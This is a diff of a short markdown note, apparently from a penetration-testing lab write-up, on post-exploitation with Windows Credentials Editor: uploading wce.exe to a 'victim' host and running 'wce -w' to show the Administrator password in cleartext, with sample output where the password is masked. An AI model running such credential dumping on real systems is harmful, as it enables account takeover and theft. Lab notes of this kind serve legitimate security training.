@@ -5,6 +5,7 @@ title: WCE post exploitation
 ---
 
 
+
 Download wce
 
     cd /opt/
@@ -13,12 +14,12 @@ Download wce
 
 Upload wce.exe to victim
 
-**Victim**:  Execute wce.  Administrator password displayed in the clear
+**Victim**:  Execute wce.  Administrator password displayed in the clear.  (real password masked just in case any potential oscp students are actually reading this)
 
     C:\Documents and Settings\Administrator\My Documents>wce -w
     wce -w
     WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security -     by Hernan Ochoa (hernan@ampliasecurity.com)
     Use -h for help.
 
-    Administrator\RALPH:_<password>_
+    Administrator\RALPH:*<password>*
     RALPH$\THINC.LOCAL:
